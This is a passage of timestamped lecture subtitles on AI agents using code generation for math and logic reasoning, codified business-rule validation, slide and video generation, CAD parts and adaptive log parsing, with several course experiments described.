An ordinary capability is an Agent's ability to do a specific thing—answer a question, call a certain API, generate a piece of text.

453
01:10:35.070 --> 01:10:49.208
A meta-capability is an ability that "can create other abilities": the Agent uses it to write new tools, new constraints, and new forms of expression on the fly to accomplish a task, without needing to have all capabilities pre-built.

454
01:10:49.208 --> 01:11:09.570
Code generation is precisely such a meta-capability—it is precise, executable, and composable, allowing it to produce new tools (scripts, API call sequences), new constraints (assertions, validation rules), and new forms of expression (HTML forms, PPTs, video frames).

455
01:11:09.570 --> 01:11:15.920
For this reason, the role code plays in an Agent system goes far beyond "writing programs.

456
01:11:15.920 --> 01:11:23.820
The next six sections demonstrate, one by one, six directions in which this meta-capability applies beyond programming.

457
01:11:23.820 --> 01:11:32.845
These six directions are not merely a flat list; they progress from the inside out, organized by the object to which the meta-capability is applied:

458
01:11:32.845 --> 01:11:39.258
Thinking Itself—using code to replace error-prone natural-language reasoning (Thinking Tools)

459
01:11:39.258 --> 01:11:46.058
Business Rules—encoding vague policies as executable constraints (Business Rule Constraints)

460
01:11:46.058 --> 01:11:54.420
Content Presentation—generating PPTs, videos, and visualization artifacts (Multimedia Generation)

461
01:11:54.420 --> 01:12:02.845
System Interfaces—bridging heterogeneous APIs and automatically adapting to evolving data formats (System Adapters)

462
01:12:02.845 --> 01:12:09.645
User Interfaces—dynamically constructing forms and interactive interfaces (Generative UI)

463
01:12:09.645 --> 01:12:16.445
The Agent Itself—using code to create or repair new Agents, thereby enabling bootstrapping.

464
01:12:16.445 --> 01:12:18.783
Code as a Thinking Tool.

465
01:12:18.783 --> 01:12:29.670
LLMs are remarkable at understanding and generating natural language, yet fundamentally weak at precise calculation, symbolic manipulation, and strict logical deduction.

466
01:12:29.670 --> 01:12:39.558
The reason: a model's thinking is inherently probabilistic and approximate, while mathematical and logical problems demand deterministic, exact answers.

467
01:12:39.558 --> 01:12:42.770
One concrete comparison makes the point:

468
01:12:42.770 --> 01:12:47.508
Refer to the companion repository for the complete code implementation.

469
01:12:47.508 --> 01:12:59.195
Let the LLM be responsible for understanding the problem and writing the code, and let the code interpreter be responsible for precise calculation—this division of labor lets each play to its strengths.

470
01:12:59.195 --> 01:13:04.920
Stephen Wolfram, the creator of Mathematica, offered a profound insight on this.

471
01:13:04.920 --> 01:13:19.345
Before LLMs existed, there were already systems capable of precise mathematical computation—they worked using Symbolic Computation, i.e., processing expressions using mathematical symbols rather than approximate numerical values.

472
01:13:19.345 --> 01:13:35.058
For example, a conventional calculator would approximate \sqrt{2} as 1.414, whereas a symbolic computation system would preserve the exact form \sqrt{2}, only converting to a decimal when necessary.

473
01:13:35.058 --> 01:13:43.195
Wolfram Alpha, created by Wolfram, is such a system: users input a math problem, and it returns an exact answer.

474
01:13:43.195 --> 01:14:00.133
However, its natural language understanding is quite fragile and its coverage is narrow—it relies on a built-in grammar parser that can only recognize a limited set of phrasings; a slight change in phrasing could cause parsing to fail, and it certainly cannot handle open-domain multi-step reasoning.

475
01:14:00.133 --> 01:14:08.745
LLMs perfectly fill this gap—they excel at understanding various natural language expressions but are not good at precise calculation.

476
01:14:08.745 --> 01:14:32.208
The new collaborative model is: let the LLM be responsible for understanding the user's natural language question, identifying the mathematical or logical structure within it, and translating it into a formal language (such as the Mathematica language or Python's SymPy library); then hand it over to a dedicated symbolic computation engine or constraint solver for execution to obtain precise results.

477
01:14:32.356 --> 01:14:41.468
Experiment 5-3 intermediate difficulty, two stars: : Using Code Generation Tools to Improve Mathematical Problem-Solving Ability

478
01:14:41.418 --> 01:14:48.968
Experiment Goal: Verify the accuracy improvement of an Agent's mathematical thinking when assisted by a Code Interpreter.

479
01:14:48.968 --> 01:14:57.743
Technical Approach: Equip the Agent with a Python sandbox containing mathematical libraries like sympy, numpy, and scipy.

480
01:14:57.743 --> 01:15:11.818
When the Agent encounters a math problem, it formalizes it into Python code: sympy for symbolic computation (calculus, equation solving), scipy for numerical optimization, numpy for matrix operations.

481
01:15:11.818 --> 01:15:17.006
The generated code is executed in the sandbox to return precise results.

482
01:15:17.006 --> 01:15:25.581
Acceptance Criteria: Evaluate using AIME-style problems (modeled after the American Invitational Mathematics Examination).

483
01:15:25.581 --> 01:15:34.643
Compare the accuracy of pure chain-of-thought reasoning with that of code-assisted reasoning; the code-assisted mode should achieve significantly higher accuracy.

484
01:15:34.643 --> 01:15:41.506
Check whether the code correctly uses the mathematical libraries and whether the solution process is logically clear.

485
01:15:41.506 --> 01:15:50.006
Experiment 5-4 intermediate difficulty, two stars: : Using Code Generation Tools to Improve Logical Reasoning Ability

486
01:15:50.006 --> 01:15:56.918
Experiment Goal: Assess the Agent's ability to perform logical reasoning with the help of constraint-solving code.

487
01:15:56.918 --> 01:16:03.318
Technical Approach: Equip the Agent with a Code Interpreter containing the python-constraint library.

488
01:16:03.318 --> 01:16:20.231
The Agent translates logic puzzles, such as Knights and Knaves problems, into formal constraint models: it identifies the variables (each islander's identity), encodes rules such as "knights tell the truth" as constraints, and invokes the solver to find a satisfying assignment.

489
01:16:20.231 --> 01:16:25.406
Acceptance Criteria: Evaluate using the K&K Puzzle dataset.

490
01:16:25.406 --> 01:16:33.906
The code-assisted mode should achieve a solution accuracy of over 90%, significantly higher than when reasoning without code assistance.

491
01:16:33.906 --> 01:16:40.106
This experiment also reveals a more general pattern: model and harness trade off against each other.

492
01:16:40.106 --> 01:16:48.668
When the model is strong enough, the harness can be thinner—the model reasons correctly on its own, and the gain from a code solver narrows.

493
01:16:48.668 --> 01:16:57.218
When the model is weaker, the harness must do more—offloading the key logical reasoning to code and constraint solvers to guarantee correctness.

494
01:16:57.218 --> 01:17:18.606
That is why this experiment deliberately uses a weaker model, to amplify the contrast: a weaker model frequently makes calculation errors when reasoning without code assistance, and code assistance lifts accuracy dramatically; a sufficiently strong reasoning model often solves every puzzle without code assistance, and the gain from code assistance converges to near zero.

495
01:17:18.606 --> 01:17:33.643
How thick the harness should be, then, depends on where your model's capability boundary lies—a premise easily overlooked when evaluating any Agent technique: the same harness, paired with models of different strength, can support opposite conclusions.

496
01:17:33.643 --> 01:17:36.793
Code as a Constraint for Business Rules.

497
01:17:36.793 --> 01:17:42.231
This section is a direct response to the Harness Engineering section earlier in this chapter.

498
01:17:42.231 --> 01:17:57.206
One of the core principles of the Harness is "Constraints: Encoded, Not Documented"—transforming rules from natural language documentation into executable code, making them mandatory constraints on system behavior rather than advisory guidelines.

499
01:17:57.206 --> 01:18:02.943
Code generation enables the Agent to autonomously complete this transformation process.

500
01:18:02.943 --> 01:18:10.181
Business rules, workflows, and decision logic described only in natural language are riddled with ambiguity.

501
01:18:10.181 --> 01:18:13.243
What is a "reasonable refund request"?

502
01:18:13.243 --> 01:18:15.918
What counts as an "emergency"?

503
01:18:15.918 --> 01:18:25.393
The boundaries resist natural-language definition—"refundable within 7 days of purchase" sounds clear, but are those calendar days or business days?

504
01:18:25.393 --> 01:18:28.956
Does "purchase" mean order placement or shipment?

505
01:18:28.956 --> 01:18:38.443
Code, by contrast, is an unambiguous, executable representation of knowledge—it either runs or throws an error; there is no in-between.

506
01:18:38.443 --> 01:18:42.018
Precisely Expressing Complex Business Rules.

507
01:18:42.018 --> 01:18:47.993
Natural Language Rules vs. Codified Rules: Complementary, Not Interchangeable

508
01:18:48.148 --> 01:19:01.760
Writing rules in the system prompt allows the model to explain policies to users, identify policy-compliant alternatives (e.g., "rebook instead of cancel"), and make a preliminary feasibility judgment before calling a tool.

509
01:19:01.710 --> 01:19:22.760
Codifying rules as validation tools offers three advantages: precise, unambiguous decision logic; deterministic execution, so the same input always produces the same output; and effective handling of complex rule combinations, such as multi-condition Boolean logic, time calculations, and cross-data-source validation.

510
01:19:22.760 --> 01:19:36.985
In practice, they should be used together: the system prompt contains natural language rules for understanding and communication, while key decision points are equipped with codified validation tools acting as "gatekeepers" to ensure compliance.

511
01:19:36.985 --> 01:19:43.160
The true value of codified rules is not token efficiency but preventing irreversible mistakes.

512
01:19:43.160 --> 01:19:49.948
Canceling an order, transferring funds, or deleting data may be impossible to undo once executed.

513
01:19:49.948 --> 01:19:58.823
Codified validation places a last line of defense in front of the operation, and the value of that guarantee far outweighs its implementation cost.

514
01:19:58.823 --> 01:20:05.823
Combining Validation with Execution: Checklists Guide Reasoning; Ground-Truth Validation Guards the Gate

515
01:20:05.823 --> 01:20:11.960
Instead of building a separate validation tool, put the validation inside the execution tool.

516
01:20:11.960 --> 01:20:23.360
Consider the airline cancellation policy from τ-bench, a benchmark designed to evaluate tool use and policy compliance in simulated airline and e-commerce customer-service scenarios:

517
01:20:23.360 --> 01:20:32.860
Here is the structured JSON representation exchanged with the API, defining the model parameters, conversation history, and tool definitions.

518
01:20:32.860 --> 01:20:36.898
The value of this design should be understood on two levels.

519
01:20:36.898 --> 01:20:40.835
First level: parameters as a thinking checklist.

520
01:20:40.835 --> 01:20:56.148
The tool description lists the complete cancellation policy and requires the model to "query order details and check each condition one by one before calling"; the optional expected_ parameters further prompt the model to explicitly write out its own reasoning.

521
01:20:56.148 --> 01:21:08.123
To fill in these parameters, the model must first call the query tool to get order details and verify each condition one by one — filling in these parameters therefore acts as a mandatory checklist.

522
01:21:08.123 --> 01:21:22.898
When the model finds that the cabin class is economy and insurance has not been purchased, it may notice Rule 5 while preparing the call and therefore avoid initiating it, instead directly telling the user "Economy class without insurance cannot be cancelled.

523
01:21:22.898 --> 01:21:27.360
Consider purchasing insurance before cancelling or changing your booking.

524
01:21:27.360 --> 01:21:33.960
This layer guides reasoning and reduces invalid calls; however, it is not a security boundary.

525
01:21:33.960 --> 01:21:40.398
The expected_ values are only self-reported claims, never facts trusted by the server.

526
01:21:40.398 --> 01:21:45.360
Second level: server-side ground-truth validation as the gatekeeper.

527
01:21:45.360 --> 01:21:58.348
Note the key design in the code: cabin class, insurance status, booking time, segment usage, and flight status are all queried from the database by the server; the current time comes from the server clock.

528
01:21:58.348 --> 01:22:02.860
No policy fact comes from the model's self-reported parameters.

529
01:22:02.860 --> 01:22:17.435
This is not needless redundancy: the model may hallucinate or be manipulated by prompt injection, and—as the earlier Lethal Triad analysis showed—an Agent operating within a single context cannot reliably validate its own behavior.

530
01:22:17.435 --> 01:22:30.735
If cabin_class, has_insurance, and even current_time were designed as parameters filled in by the model, a single false value—whether accidental or induced—could bypass the gatekeeper.

531
01:22:30.735 --> 01:22:46.148
The last line of defense must be built on data that the model cannot forge — this is consistent with the earlier stance that "critical operations require independent verification": independence refers not only to an independent model but also to an independent data source.

532
01:22:46.300 --> 01:23:07.900
The three-tier safeguard is thus complete: (1) natural language rules in the system prompt aid understanding and explanation; (2) tool descriptions and parameter design serve as a checklist, guiding the model to explicitly verify conditions before calling; (3) server-side code-based validation using database ground truth acts as the final gatekeeper.

533
01:23:07.850 --> 01:23:15.250
The first two tiers reduce the occurrence of errors, and the third ensures that errors do not become irreversible losses.

534
01:23:15.250 --> 01:23:24.350
Experiment 5-5 intermediate difficulty, two stars: : Small models improve rule execution accuracy through code-based knowledge

535
01:23:24.350 --> 01:23:37.037
Experiment objective: Verify that encoding complex business rules in code significantly improves the accuracy and consistency with which a small model (Qwen3-4B) executes those rules.

536
01:23:37.037 --> 01:23:43.662
Technical approach: Design a controlled experiment based on the τ-bench airline customer service scenario.

537
01:23:43.662 --> 01:23:49.225
Control group: Pure natural language rules, relying on the model's own reasoning.

538
01:23:49.225 --> 01:24:18.387
Experimental group: Three-tier safeguard — system prompt retains natural language rules; tool description lists the complete policy and uses optional expected_ parameters to guide the model to check each condition one by one before calling (checklist); the tool internally performs code-based validation based on simulated database ground truth (all policy facts are obtained from the database, time is taken from the server clock, and the model's self-reported parameters are not trusted).

539
01:24:18.387 --> 01:24:27.562
Evaluation metrics: task success rate, number of policy violations, number of invalid tool calls, user experience.

540
01:24:27.562 --> 01:24:33.250
Expected results: The experimental group significantly outperforms the control group.

541
01:24:33.250 --> 01:24:44.837
More importantly, the model autonomously identifies policy violations while preparing parameters and offers alternatives without calling the tool, demonstrating the value of parameters as a checklist.

542
01:24:44.837 --> 01:24:56.012
Finally, measure the mismatch rate between self-reported expected_ values and database ground truth to show why server-side validation is necessary for catching reasoning errors.

543
01:24:56.012 --> 01:24:58.937
Code-Driven Multimedia Generation.

544
01:24:58.937 --> 01:25:05.412
The creation of many complex documents is essentially the organization and presentation of structured data.

545
01:25:05.412 --> 01:25:19.725
Whether it's a presentation, a technical report, or an interactive application, the underlying structure is defined by code — HTML describes the structure, CSS controls the style, and JavaScript implements interactivity.

546
01:25:19.725 --> 01:25:30.012
Traditional document creation relies on GUI-based WYSIWYG editors, which are a poor fit for Agents because they require visual interpretation and precise pointer placement.

547
01:25:30.012 --> 01:25:44.262
Through code generation, Agents bypass the challenge of visual positioning and gain precise control over documents — the position, style, and content of each element are clearly defined and can be modified and optimized programmatically.

548
01:25:44.262 --> 01:25:47.062
PPT Generation Agent.

549
01:25:47.062 --> 01:25:50.862
PPT creation is notoriously laborious.

550
01:25:50.862 --> 01:25:59.900
A typical academic presentation runs to dozens of slides, each demanding careful layout, distilled key points, and well-chosen charts.

551
01:25:59.900 --> 01:26:07.112
Reframe PPT creation as a code generation problem, however, and much of the complexity falls away.

552
01:26:07.112 --> 01:26:15.600
Modern presentation frameworks such as Slidev embrace an elegant design philosophy: define the content in Markdown and HTML.

553
01:26:15.600 --> 01:26:23.075
Creating a slide takes a few lines of concise markup, and the framework handles rendering, layout, and animation.

554
01:26:23.075 --> 01:26:27.987
For an Agent that has mastered code generation, this is ideal terrain.

555
01:26:27.987 --> 01:26:34.775
As illustrated in Figure 5-5: Proposer-Reviewer mechanism for PPT generation.

556
01:26:34.775 --> 01:26:38.025
Generating the code is not enough, though.

557
01:26:38.025 --> 01:26:51.200
Once the Agent has written the code, it has no idea how the result actually renders: content too crowded, text overflowing, images the wrong size — none of this is visible until the slides are actually rendered.

558
01:26:51.200 --> 01:27:01.450
Therefore, a Proposer-Reviewer mechanism (shown in Figure 5-5) is needed to assign code generation and quality review to two independent Agents:

559
01:27:01.450 --> 01:27:11.012
Proposer Agent is responsible for generating Slidev code, understanding the logical structure of the content, and organizing it into well-structured slides.

560
01:27:11.164 --> 01:27:44.839
Reviewer Agent runs the code to render each page as an image, uses a Vision LLM (a multimodal large model that can "see" images) to evaluate the rendered slides for content density, readability, layout quality, and visual appeal, and generates structured improvement suggestions — not vague "doesn't look good," but specific, actionable guidance (e.g., "Page 3: too much content, consider splitting"; "Page 7: code block font too small, suggest increasing to 14pt"), including fields such as page

561
01:27:44.839 --> 01:27:48.101
number, issue type, and severity.

562
01:27:48.101 --> 01:27:55.726
The Proposer receives the feedback, interprets it, modifies the code, and resubmits the new version to the Reviewer.

563
01:27:55.726 --> 01:28:05.051
This cycle continues until the presentation meets the quality standard or the maximum number of iterations (e.g., five rounds) is reached.

564
01:28:05.051 --> 01:28:19.939
Quality meets the standard" and "maximum rounds" are exactly the two kinds of explicit stop conditions Loop Engineering calls for: the former lets the reviewer decide the goal has been reached; the latter is a budget cap that keeps the loop from running away.

565
01:28:19.939 --> 01:28:32.501
The iterative loop here and the pre-approval mechanism in Chapter 4 both follow the Proposer-Reviewer pattern introduced in Chapter 1: generation and review are separated, with two models evaluating independently.

566
01:28:32.501 --> 01:28:38.564
In Loop Engineering terms, these are separate "maker" and "verifier" sub-agents.

567
01:28:38.564 --> 01:28:42.351
The two applications differ in purpose and workflow.

568
01:28:42.351 --> 01:28:55.264
Chapter 4 uses the pattern to approve or reject a single irreversible operation; here, it drives iterative content improvement over multiple rounds, with the Reviewer seeing rendered output unavailable to the Proposer.

569
01:28:55.264 --> 01:29:07.339
The core design principles are consistent (shared goal constraints, using different model families to reduce the probability of similar errors, feedback as a special event added to the Proposer's trajectory).

570
01:29:07.339 --> 01:29:26.164
The core advantage of using a dual-agent division of labor rather than a single-agent loop lies in context management: the Reviewer processes only the latest version's rendered images, unaffected by historical versions; the Proposer only accumulates structured text feedback, consuming fewer tokens and making reasoning easier.

571
01:29:26.164 --> 01:29:35.601
A single-agent solution would need to accumulate rendered images from multiple rounds for dozens of pages in the same context, quickly exceeding the context limit.

572
01:29:35.601 --> 01:29:47.651
This mechanism will be reused in subsequent experiments on video editing and log visualization; Chapter 10 will further explore other multi-agent collaboration modes beyond the Proposer-Reviewer paradigm.

573
01:29:47.812 --> 01:29:55.474
Experiment 5-6 intermediate difficulty, two stars: : Automatic PPT generation from papers

574
01:29:55.424 --> 01:30:07.249
Experiment objective: Automatically generate high-quality presentations from academic papers, verifying the effectiveness of the Proposer-Reviewer mechanism in content creation quality control.

575
01:30:07.249 --> 01:30:10.912
Technical approach: Use the Slidev framework.

576
01:30:10.912 --> 01:30:22.649
The Proposer Agent reads the paper PDF, extracts chapter structure, core arguments, and figures, plans the PPT structure, and generates Slidev code page by page.

577
01:30:22.649 --> 01:30:35.349
Key step: The Reviewer Agent renders each slide and captures a screenshot, then uses a Vision LLM to evaluate the result for text overflow, content crowding, and inappropriate image sizing.

578
01:30:35.349 --> 01:30:40.524
The Proposer and Reviewer iterate until the presentation meets the quality standard.

579
01:30:40.524 --> 01:30:46.912
Acceptance criteria: Generate 10-20 slides covering the paper's main contributions.

580
01:30:46.912 --> 01:30:51.724
Include at least three figures from the paper that match the accompanying text.

581
01:30:51.724 --> 01:30:55.724
No text overflow in rendering, reasonable layout.

582
01:30:55.724 --> 01:31:03.437
Compare context consumption and generation quality between single-agent self-review and a Proposer-Reviewer division of labor.

583
01:31:03.437 --> 01:31:11.387
Experiment 5-7 intermediate difficulty, two stars: : Automatic generation of paper explanation videos

584
01:31:11.387 --> 01:31:22.049
Experiment objective: Extend PPT generation capabilities, combining visual and auditory channels to achieve automatic generation of explanation videos.

585
01:31:22.049 --> 01:31:43.574
Technical approach: Building on the presentation workflow from Experiment 5-6, the Agent also generates conversational narration for each slide—guiding the viewer rather than repeating the slide text—uses TTS (text-to-speech) to synthesize the audio, and combines the slide images and audio with FFmpeg to produce the final video.

586
01:31:43.574 --> 01:31:54.912
Acceptance criteria: Produce a video lasting 5 to 15 minutes in which each slide's display time precisely matches its narration and the narration corresponds to the visual elements.

587
01:31:54.912 --> 01:32:01.462
As illustrated in Figure 5-6: End-to-end pipeline from paper to explanation video.

588
01:32:01.462 --> 01:32:03.774
Video Editing Agent.

589
01:32:03.774 --> 01:32:16.237
Editing video through a general-purpose Computer Use interface presents a fundamental obstacle: video-editing GUIs are extraordinarily complex — dense with timelines, layers, and effects panels.

590
01:32:16.237 --> 01:32:24.662
An Agent must locate and manipulate these elements with a mouse and keyboard, which requires exact coordinates that models struggle to produce.

591
01:32:24.662 --> 01:32:31.049
Reframing video editing as API calls and code generation cuts the complexity dramatically.

592
01:32:31.049 --> 01:32:51.512
Many professional software tools (such as Blender — an open-source 3D creation and video compositing tool that supports Python scripting; FFmpeg — the command-line Swiss Army knife for audio/video processing) provide programmatic API interfaces that expose core functionality in a structured, composable manner.

593
01:32:51.512 --> 01:33:06.812
For example, the Blender Python API allows precise control over operations such as importing, trimming, arranging, adding transition effects, and mixing audio for video clips, with each operation corresponding to a clear function call.

594
01:33:06.812 --> 01:33:16.424
For an Agent, converting natural language requirements into API calls is far easier than understanding a GUI interface and simulating mouse clicks.

595
01:33:16.424 --> 01:33:32.274
Similar to PPT generation, video editing also adopts the Proposer-Reviewer mechanism — the Proposer Agent generates Blender scripts, the Reviewer Agent renders keyframes and uses a Vision LLM to check the effect, providing feedback for modification.

596
01:33:32.274 --> 01:33:39.374
Experiment 5-8 intermediate difficulty, two stars: : API-based intelligent video editing

597
01:33:39.374 --> 01:33:53.449
Experiment objective: Verify the Agent's ability to perform video editing by generating Blender Python API code, and evaluate the role of the vision-feedback-based Proposer-Reviewer mechanism in multimedia content processing.

598
01:33:53.620 --> 01:34:12.582
Core challenge: Understanding the user's natural language editing requirements and converting them into precise sequences of API calls, handling various editing operations (trimming, merging, subtitles, audio track mixing, visual effects), and ensuring the generated Python script executes correctly.

599
01:34:12.532 --> 01:34:23.270
After the Proposer Agent writes the code, it cannot directly assess the resulting video; it must rely on the Reviewer Agent to render and use a Vision LLM to check keyframes.

600
01:34:23.270 --> 01:34:36.845
Technical approach: The user provides video material (e.g., raw footage containing scenes like surfing, hiking, skiing) and describes requirements in natural language (e.g., "Extract the surfing segment").

601
01:34:36.845 --> 01:34:42.982
The Proposer Agent uses a video analysis sub-agent with a two-step localization strategy:

602
01:34:42.982 --> 01:34:51.782
Step 1, coarse localization: Call the sub-agent with the video path, a 10-second frame-sampling interval, and the target question.

603
01:34:51.782 --> 01:35:04.645
The sub-agent uses ffmpeg to capture frames at that interval, sends the screenshots and question to a Vision LLM, and returns the scene interval (e.g., "Surfing is between 40-110 seconds").

604
01:35:04.645 --> 01:35:14.307
Step 2, fine-grained localization: Call the sub-agent again over a narrower range and sample one frame per second to locate the boundaries precisely.

605
01:35:14.307 --> 01:35:22.220
Encapsulating video analysis as a sub-agent prevents a large number of screenshots from occupying the main Agent's context.

606
01:35:22.220 --> 01:35:27.332
After localization, the Proposer generates the Blender API script.

607
01:35:27.332 --> 01:35:37.195
The Reviewer Agent performs a quick preview, checks keyframes, and provides feedback for modification, iterating until the standard is met before full rendering.

608
01:35:37.195 --> 01:35:46.770
Acceptance criteria: The Agent can accurately identify different scenes in the video and correctly generate editing scripts based on natural language instructions.

609
01:35:46.770 --> 01:35:51.357
The start and end points are accurate (error within 3 seconds).

610
01:35:51.357 --> 01:36:01.195
If the instructions include special effects requirements (slow motion, transitions, subtitles), the generated video correctly applies the effects.

611
01:36:01.195 --> 01:36:09.345
The Reviewer Agent can detect obvious errors (missing key content, including irrelevant segments) and trigger corrections.

612
01:36:09.345 --> 01:36:14.607
The final output video file has the correct format and meets expected quality.

613
01:36:14.607 --> 01:36:20.757
3D and Industrial Parts: The Boundary Between Code Generation and Generative Models.

614
01:36:20.757 --> 01:36:42.232
When it comes to "generating a thing," the Agent faces two routes: one is writing code to construct it precisely (CadQuery, OpenSCAD, Blender API); the other is calling a 3D generative model directly (text/image-to-3D models like Hunyuan 3D, which belong to the same diffusion family as text-to-image models).

615
01:36:42.232 --> 01:36:50.220
Many people wrestle with the question: when should you use code generation, and when should you use an image/3D generative model?

616
01:36:50.220 --> 01:36:55.257
First, check whether the artifact has a compact, precise description.

617
01:36:55.257 --> 01:36:58.207
Industrial parts naturally have one.

618
01:36:58.207 --> 01:37:09.995
A flange is fully defined by five or six parameters—outer diameter, thickness, bolt-circle diameter, hole diameter, hole count—and code is a lossless expression of it.

619
01:37:09.995 --> 01:37:19.382
A potted plant, a Taihu rock, or a human face is different—they have countless details, and their intrinsic complexity is nearly unbounded.

620
01:37:19.382 --> 01:37:23.832
Second, check the precision requirements and verifiability.

621
01:37:23.832 --> 01:37:34.857
Every dimension of a part is a hard constraint—hole diameter 5mm, tolerance ±0.05mm; off by a hair and it is scrap.

622
01:37:34.857 --> 01:37:45.395
A code-generated part can be verified programmatically: load the mesh, measure the outer diameter and hole positions, and check them item by item against the specification.

623
01:37:45.395 --> 01:37:51.532
A part produced by a 3D generative model cannot be checked against the specification directly.

624
01:37:51.700 --> 01:37:57.200
The two routes differ in one more practical way: representation and editability.

625
01:37:57.150 --> 01:38:09.375
Manufacturing workflows demand B-rep (boundary representation) parametric solids—the STEP file stores the feature tree and dimensional parameters and can drive CNC machining directly.

626
01:38:09.375 --> 01:38:19.350
What a 3D generative model spits out is a triangle mesh: curved surfaces are approximated by countless tiny facets and look pitted under magnification.

627
01:38:19.350 --> 01:38:38.450
The difference becomes clear when the client says "change the mounting holes from M5 to M6": on the code route, you change one number and rerun, and every other dimension stays exactly the same; on the generative-model route, the only option is to regenerate the whole thing—whether the other dimensions drift is a matter of luck.

628
01:38:38.450 --> 01:38:50.437
So choosing a route is itself a decision the Agent must make: weigh the artifact's intrinsic complexity and precision requirements, and assign the task to code generation or to a 3D generative model.

629
01:38:50.437 --> 01:39:00.700
In real systems the two routes can also be mixed—generate the geometry parametrically with code and hand the surface texture to a generative model, taking the best of each.

630
01:39:00.700 --> 01:39:09.675
Experiment 5-9 intermediate difficulty, two stars: : Two Generation Routes for the Same Part—Code vs. Generative Model

631
01:39:09.675 --> 01:39:28.450
Experiment objective: Take the same mechanical part with dimensional specifications and compare the code-generation and 3D-generative-model routes on dimensional accuracy, editability, and manufacturability, verifying the "choose the route by intrinsic complexity and precision requirements" decision framework.

632
01:39:28.450 --> 01:39:43.087
Technical approach: A natural-language requirement with an explicit specification (e.g., "a flange, outer diameter 80mm, thickness 10mm, 4 evenly spaced M5 mounting holes on a 60mm bolt circle").

633
01:39:43.087 --> 01:39:51.025
Route A: the Agent writes CadQuery (or OpenSCAD) code to construct the part and exports STEP and STL.

634
01:39:51.025 --> 01:39:59.587
Route B: hand the same specification to a 3D generative model (such as Hunyuan 3D) to obtain a triangle mesh.

635
01:39:59.587 --> 01:40:12.812
Programmatic verification: measure the key dimensions of both routes' outputs (outer diameter, thickness, hole positions, hole diameters) against the specification, and check the flatness of the mounting face.

636
01:40:12.812 --> 01:40:31.612
Then issue the change request "change the mounting holes from M5 to M6" and record the modification cost of each route—on the code route, change one parameter and rerun; on the generative-model route, the only option is to regenerate the whole thing, with no guarantee that the other dimensions stay unchanged.

637
01:40:31.612 --> 01:40:45.862
Control group: generate a potted plant, and the merits of the two routes are exactly reversed—on the code route, even with procedural noise added, the result is stiff and lifeless; on the generative-model route, it is natural and vivid.

638
01:40:45.862 --> 01:40:48.362
Code as a System Adapter.

639
01:40:48.362 --> 01:40:56.225
The code in the previous sections mostly produces "human-facing" things — reports, slides, interfaces.

640
01:40:56.225 --> 01:41:01.300
The code in this section points in another direction: connecting machine to machine.

641
01:41:01.300 --> 01:41:16.450
In real systems, the external services an Agent must talk to often have no ready-made SDK, and their interfaces are rarely tidy — documentation may be missing, response formats may be nonstandard, and fields may drift across versions.

642
01:41:16.450 --> 01:41:19.937
The Agent need not wait for a prebuilt adapter.

643
01:41:19.937 --> 01:41:37.912
It can read the API documentation or inspect a few real responses, then generate the adapter on demand: construct an HTTP client, assemble authentication headers, parse the nonstandard response structure, and translate the upstream data model into a shape the downstream can consume.

644
01:41:37.912 --> 01:41:47.150
Code here is "universal glue" for connecting arbitrary systems — wherever there is a gap, a piece of glue is generated on demand to fill it.

645
01:41:47.150 --> 01:41:51.962
This is the heart of the meta-capability's "system interface" direction.

646
01:41:51.962 --> 01:42:04.912
The adaptive log parsing developed below is this capability made concrete in the observability setting: facing log formats that never stop evolving, the Agent likewise adapts by generating parsing code on the fly.

647
01:42:05.068 --> 01:42:31.018
This "universal glue" can also extend to systems with no API at all: when an external system only exposes a graphical interface, the Agent can first operate the interface through Computer Use (detailed in Chapter 6), then turn the successful sequence of actions into a reusable RPA tool — the next time the same task comes up, it simply runs the code, fast and stable, with no expensive visual reasoning required.

648
01:42:31.018 --> 01:42:39.343
RPA, you might say, is the system adapter taken to its extreme: an adapter for systems with no programmatic interface.

649
01:42:39.343 --> 01:42:45.180
Chapter 9 develops this process of recording workflows and turning them into reusable code.

650
01:42:45.180 --> 01:42:51.593
Data processing is among the most common — and most tiresome — tasks in software systems.

651
01:42:51.593 --> 01:42:56.330
The root cause is that data formats are diverse and never stand still.

652
01:42:56.330 --> 01:43:04.168
A single system may change its formats many times as it evolves — new fields, restructured nesting, new types.

653
01:43:04.168 --> 01:43:14.755
Hand-writing a parser for every format carries a punishing maintenance cost: each change means updating the parsing logic, testing compatibility, and shipping a new version.

654
01:43:14.755 --> 01:43:28.593
Code generation offers a different approach entirely: when the Agent meets a new format, it generates parsing code on the fly from sample data, so the system tracks the evolution of formats automatically, with no human intervention.

655
01:43:28.593 --> 01:43:31.755
Agent Log Parsing and Visualization.

656
01:43:31.755 --> 01:43:37.368
The observability of Agent systems depends on the visualization of execution flows.

657
01:43:37.368 --> 01:43:48.343
A complex Agent task may involve hundreds of steps, including multiple LLM calls, dozens of tool executions, and interactions between multiple sub-agents.

658
01:43:48.343 --> 01:44:03.880
Visualizing this data faces multiple challenges: different tools return data in different structures, and formats evolve with system iterations; a complete trajectory may contain hundreds of thousands of characters, requiring a balance between overview and detail.

659
01:44:03.880 --> 01:44:09.768
Code generation offers an elegant solution: establishing an auto-repair feedback loop.

660
01:44:09.768 --> 01:44:21.293
When the frontend encounters an unparseable log format, instead of displaying an error, it automatically reports the failure information (raw log sample, detailed error) to the Agent.

661
01:44:21.293 --> 01:44:27.480
The Agent analyzes the sample data structure and generates frontend code that can correctly parse it.

662
01:44:27.480 --> 01:44:36.218
The code is first tested automatically in a virtual browser to verify parsing correctness, while a Vision LLM assesses the visualization.

663
01:44:36.218 --> 01:44:41.293
If it passes both checks, it is deployed to the frontend as a hot update.

664
01:44:41.293 --> 01:44:47.755
Experiment 5-10 advanced difficulty, three stars: : Adaptive Log Parsing System

665
01:44:47.755 --> 01:44:53.055
Experiment Goal: Build a self-evolving Agent log visualization system.

666
01:44:53.055 --> 01:44:58.118
Technical Approach: The initial system only supports basic formats.

667
01:44:58.118 --> 01:45:05.655
Frontend detects parsing failure → Reports to Agent → Generates parsing code → Virtual browser testing → Hot update deployment.

668
01:45:05.655 --> 01:45:08.555
The entire process is automated.

669
01:45:08.555 --> 01:45:19.268
Acceptance Criteria: Automatically detect failures and trigger learning, generate code that passes automated tests, correctly parse new formats after the hot update.

670
01:45:19.268 --> 01:45:24.468
Automatic Analysis and Problem Diagnosis of Agent Execution Logs.

671
01:45:24.468 --> 01:45:31.680
Agents in production generate a large volume of trajectory logs (recording the complete process of each task).

672
01:45:31.680 --> 01:45:39.868
However, identifying problems, locating root causes, and constructing test cases from these logs is a high-cost endeavor.

673
01:45:39.868 --> 01:45:46.643
Failures may emerge from interactions among multiple modules, making root causes difficult to isolate.

674
01:45:46.643 --> 01:45:53.555
